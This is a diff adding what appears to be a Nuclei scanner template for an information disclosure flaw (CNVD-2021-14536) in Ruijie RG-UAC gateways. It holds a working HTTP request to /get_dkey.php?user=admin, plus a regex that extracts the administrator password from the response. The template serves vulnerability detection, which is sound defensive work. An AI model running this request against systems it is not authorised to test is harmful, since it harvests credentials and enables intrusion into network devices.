@@ -1,0 +1,34 @@
+id: ruijie-rg-uac-info-disclosure
+
+info:
+  name: Ruijie RG-UAC get_dkey.php Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Ruijie RG-UAC series application management gateways suffer from an information disclosure vulnerability, allowing attackers to retrieve sensitive information through the `get_dkey.php` endpoint.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-14536
+    - https://github.com/hhroot/2021_Hvv/commit/d83e05b433ff1545d7cbb21a9b4d9a7d9bfcdfc8
+    - https://blog.csdn.net/weixin_45291045/article/details/114734172
+    - https://blog.csdn.net/Adminxe/article/details/114584215
+
+http:
+  - raw:
+      - |
+        GET /get_dkey.php?user=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"password\":"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"password\":\"(.*?)\""
